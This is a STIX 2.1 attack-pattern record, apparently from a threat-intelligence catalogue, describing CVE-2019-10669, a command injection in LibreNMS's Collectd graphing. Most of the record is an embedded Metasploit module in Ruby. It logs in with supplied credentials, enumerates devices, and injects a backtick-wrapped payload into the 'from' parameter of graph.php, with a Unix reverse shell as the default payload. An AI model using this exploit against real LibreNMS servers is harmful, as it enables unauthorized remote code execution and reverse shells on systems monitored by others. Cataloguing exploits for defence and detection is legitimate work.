{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6f9a5a82-4476-4a35-943d-4794d92af2fa",
    "created": "2024-08-14T17:02:19.717872Z",
    "modified": "2024-08-14T17:02:19.717876Z",
    "name": "LibreNMS Collectd Command Injection",
    "description": "( This module exploits a command injection vulnerability in the Collectd graphing functionality in LibreNMS.  The `to` and `from` parameters used to define the range for a graph are sanitized using the `mysqli_escape_real_string()` function, which permits backticks. These parameters are used as part of a shell command that gets executed via the `passthru()` function, which can result in code execution. ) 'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/librenms_collectd_cmd_inject.rb",
            "external_id": "librenms_collectd_cmd_inject.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-10669"
        },
        {
            "source_name": "reference",
            "url": "https://www.darkmatter.ae/xen1thlabs/librenms-command-injection-vulnerability-xl-19-017/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'LibreNMS Collectd Command Injection',\n      'Description'    => %q(\n        This module exploits a command injection vulnerability in the\n        Collectd graphing functionality in LibreNMS.\n\n        The `to` and `from` parameters used to define the range for\n        a graph are sanitized using the `mysqli_escape_real_string()`\n        function, which permits backticks. These parameters are used\n        as part of a shell command that gets executed via the `passthru()`\n        function, which can result in code execution.\n      ),\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n      [\n        'Eldar Marcussen', # Vulnerability discovery\n        'Shelby Pace'      # Metasploit module\n      ],\n      'References'     =>\n        [\n          [ 'CVE', '2019-10669' ],\n          [ 'URL', 'https://www.darkmatter.ae/xen1thlabs/librenms-command-injection-vulnerability-xl-19-017/' ]\n        ],\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n      [\n        [ 'Linux',\n          {\n            'Platform'        =>  'unix',\n            'Arch'            =>  ARCH_CMD,\n            'DefaultOptions'  =>  { 'Payload' => 'cmd/unix/reverse' }\n          }\n        ]\n      ],\n      'DisclosureDate' => '2019-07-15',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n    [\n      OptString.new('TARGETURI', [ true, 'Base LibreNMS path', '/' ]),\n      OptString.new('USERNAME', [ true, 'User name for LibreNMS', '' ]),\n      OptString.new('PASSWORD', [ true, 'Password for LibreNMS', '' ])\n    ])\n  end\n\n  def check\n    res = send_request_cgi!('method'  =>  'GET', 'uri'  =>  target_uri.path)\n    return Exploit::CheckCode::Safe unless res && res.body.downcase.include?('librenms')\n\n    about_res = send_request_cgi(\n      'method'  =>  'GET',\n      'uri'     =>  normalize_uri(target_uri.path, 'pages', 'about.inc.php')\n    )\n\n    return Exploit::CheckCode::Detected unless about_res && about_res.code == 200\n\n    version = about_res.body.match(/version\\s+to\\s+(\\d+\\.\\d+\\.?\\d*)/)\n    return Exploit::CheckCode::Detected unless version && version.length > 1\n    vprint_status(\"LibreNMS version #{version[1]} detected\")\n    version = Rex::Version.new(version[1])\n\n    return Exploit::CheckCode::Appears if version <= Rex::Version.new('1.50')\n  end\n\n  def login\n    login_uri = normalize_uri(target_uri.path, 'login')\n    res = send_request_cgi('method' =>  'GET',  'uri' =>  login_uri)\n    fail_with(Failure::NotFound, 'Failed to access the login page') unless res && res.code == 200\n\n    cookies = res.get_cookies\n    login_res = send_request_cgi(\n      'method'    =>  'POST',\n      'uri'       =>  login_uri,\n      'cookie'    =>  cookies,\n      'vars_post' =>\n      {\n        'username'  =>  datastore['USERNAME'],\n        'password'  =>  datastore['PASSWORD']\n      }\n    )\n\n    fail_with(Failure::NoAccess, 'Failed to submit credentials to login page') unless login_res && login_res.code == 302\n\n    cookies = login_res.get_cookies\n    res = send_request_cgi(\n      'method'  =>  'GET',\n      'uri'     =>  normalize_uri(target_uri.path),\n      'cookie'  =>  cookies\n    )\n    fail_with(Failure::NoAccess, 'Failed to log into LibreNMS') unless res && res.code == 200 && res.body.include?('Devices')\n\n    print_status('Successfully logged into LibreNMS. Storing credentials...')\n    store_valid_credential(user: datastore['USERNAME'], private: datastore['PASSWORD'])\n    login_res.get_cookies\n  end\n\n  def get_version\n    uri = normalize_uri(target_uri.path, 'about')\n\n    res = send_request_cgi( 'method'  =>  'GET', 'uri' => uri, 'cookie' => @cookies )\n    fail_with(Failure::NotFound, 'Failed to reach the about LibreNMS page') unless res && res.code == 200\n\n    html = res.get_html_document\n    version = html.search('tr//td//a')\n    fail_with(Failure::NotFound, 'Failed to retrieve version information') if version.empty?\n    version.each do |e|\n      return $1 if e.text =~ /(\\d+\\.\\d+\\.?\\d*)/\n    end\n  end\n\n  def get_device_ids\n    version = get_version\n    print_status(\"LibreNMS version: #{version}\")\n\n    if version && Rex::Version.new(version) < Rex::Version.new('1.50')\n      dev_uri = normalize_uri(target_uri.path, 'ajax_table.php')\n      format = '+list_detail'\n    else\n      dev_uri = normalize_uri(target_uri.path, 'ajax', 'table', 'device')\n      format = 'list_detail'\n    end\n\n    dev_res = send_request_cgi(\n      'method'    =>  'POST',\n      'uri'       =>  dev_uri,\n      'cookie'    =>  @cookies,\n      'vars_post' =>\n      {\n        'id'              =>  'devices',\n        'format'          =>  format,\n        'current'         =>  '1',\n        'sort[hostname]'  =>  'asc',\n        'rowCount'        =>  50\n      }\n    )\n\n    fail_with(Failure::NotFound, 'Failed to access the devices page') unless dev_res && dev_res.code == 200\n\n    json = JSON.parse(dev_res.body)\n    fail_with(Failure::NotFound, 'Unable to retrieve JSON response') if json.empty?\n\n    json = json['rows']\n    fail_with(Failure::NotFound, 'Unable to find hostname data') if json.empty?\n\n    hosts = []\n    json.each do |row|\n      hostname = row['hostname']\n      next if hostname.nil?\n\n      id = hostname.match('href=\\\"device\\/device=(\\d+)\\/')\n      next unless id && id.length > 1\n      hosts << id[1]\n    end\n\n    fail_with(Failure::NotFound, 'Failed to retrieve any device ids') if hosts.empty?\n\n    hosts\n  end\n\n  def get_plugin_info(id)\n    uri = normalize_uri(target_uri.path, \"device\", \"device=#{id}\", \"tab=collectd\")\n\n    res = send_request_cgi( 'method' => 'GET', 'uri' => uri, 'cookie' => @cookies )\n    return unless res && res.code == 200\n\n    html = res.get_html_document\n    plugin_link = html.at('div[@class=\"col-md-3\"]//a/@href')\n    return if plugin_link.nil?\n\n    plugin_link = plugin_link.value\n    plugin_hash = Hash[plugin_link.split('/').map { |plugin_val| plugin_val.split('=') }]\n    c_plugin = plugin_hash['c_plugin']\n    c_type = plugin_hash['c_type']\n    c_type_instance = plugin_hash['c_type_instance'] || ''\n    c_plugin_instance = plugin_hash['c_plugin_instance'] || ''\n\n    return c_plugin, c_type, c_plugin_instance, c_type_instance\n  end\n\n  def exploit\n    req_uri = normalize_uri(target_uri.path, 'graph.php')\n    @cookies = login\n\n    dev_ids = get_device_ids\n\n    collectd_device = -1\n    plugin_name = nil\n    plugin_type = nil\n    plugin_instance = nil\n    plugin_type_inst = nil\n    dev_ids.each do |device|\n     collectd_device = device\n     plugin_name, plugin_type, plugin_instance, plugin_type_inst = get_plugin_info(device)\n     break if (plugin_name && plugin_type && plugin_instance && plugin_type_inst)\n     collectd_device = -1\n    end\n\n    fail_with(Failure::NotFound, 'Failed to find a collectd plugin for any of the devices') if collectd_device == -1\n    print_status(\"Sending payload via device #{collectd_device}\")\n\n    res = send_request_cgi(\n      'method'    =>  'GET',\n      'uri'       =>  req_uri,\n      'cookie'    =>  @cookies,\n      'vars_get'  =>\n      {\n        'device'                =>  collectd_device,\n        'type'                  =>  'device_collectd',\n        'to'                    =>  Rex::Text.rand_text_numeric(10),\n        'from'                  =>  \"1`#{payload.encoded}`\",\n        'c_plugin'              =>  plugin_name,\n        'c_type'                =>  plugin_type,\n        'c_plugin_instance'     =>  plugin_instance,\n        'c_type_instance'       =>  plugin_type_inst\n      }\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-07-15",
    "x_mitre_platforms": [
        "unix'"
    ]
}